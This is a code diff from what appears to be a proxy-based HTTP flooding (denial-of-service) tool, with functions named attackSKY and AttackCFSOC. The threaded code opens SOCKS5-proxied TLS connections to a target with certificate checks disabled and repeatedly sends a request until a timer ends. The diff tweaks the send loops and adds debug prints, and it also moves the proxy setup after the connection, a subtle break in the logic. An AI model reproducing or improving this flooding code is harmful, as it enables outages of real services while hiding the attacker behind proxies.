@@ -622,7 +622,6 @@ def AttackCFSOC(until_datetime, target, req):
 def attackSKY(url, timer, threads):
     for i in range(int(threads)):
         threading.Thread(target=LaunchSKY, args=(url, timer)).start()
-        time.sleep(1)
 
 
 def LaunchSKY(url, timer):
@@ -643,51 +642,55 @@ def LaunchSKY(url, timer):
     while time.time() < timelol:
         try:
             
+            # Create a SOCKS5 proxy socket
             s = socks.socksocket()
-            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]),True,proxy[2],proxy[3])
-            s.connect((str(urlparse(url).netloc), int(443)))
-
-
-            # ctx = ssl.SSLContext()
+            print('66666666')
+            
+            # Connect to the server
+            s.connect((str(urlparse(url).netloc), 443))
+            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]), True, proxy[2], proxy[3])
+            print('4444444')
+            
+            # Create SSL context and wrap the socket
             ctx = ssl.create_default_context()
+
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
+            ssl.debug = True
+            print('333333',urlparse(url).netloc)
+            
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            print('222222222')
+            
             try:
-                for _ in range(100000):
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
+                for _ in range(6):  # Send 6 requests per connection
+                    s.sendall(str.encode(req))
+                    print('1111')
                     
                     time.sleep(1)
+                response = s.recv(4096)
 
+                # Print the raw response
+                raw_response = response.decode()
+         
 
+                # Ensure the response is large enough to disable friendly error pages
+                min_length = 512
+                if len(raw_response) < min_length:
+                    padding = ' ' * (min_length - len(raw_response))
+                    raw_response += padding
+                
+                print("Padded response:")
+                print(raw_response)
             except Exception as e:
                 print(f'Error sending requests: {e}')
+                s.close()  # Ensure the socket is closed after use
             finally:
-                s.close()  
-            # Receive the response (optional, can be adjusted based on need)
-            response = s.recv(4096)
-
-            # Print the raw response
-            raw_response = response.decode()
-           
-            min_length = 512
-            if len(raw_response) < min_length:
-                padding = ' ' * (min_length - len(raw_response))
-                raw_response += padding
-
-            print("Padded response:")
-            print(raw_response)
-
-            # Close the socket
-            
+                s.close()  # Ensure the socket is closed after use
         except Exception as e:
-            print('------1111',e)
-            s.close()
+            print(f'Error in connection setup: {e}')
+            
+       
             
             
     
